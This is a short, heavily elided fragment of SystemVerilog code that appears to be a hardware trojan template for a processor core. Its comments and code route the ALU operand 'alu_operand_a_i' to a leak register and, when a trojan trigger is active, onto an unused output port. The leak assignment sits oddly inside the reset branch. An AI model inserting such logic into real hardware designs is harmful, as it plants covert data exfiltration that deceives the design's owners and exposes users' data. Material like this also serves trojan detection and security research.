 ...
 * Payload: Route alu_operand_a_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= alu_operand_a_i;
    end
end
...
// ============================================================
// Information Leak: Route alu_operand_a_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? alu_operand_a_i : normal_value;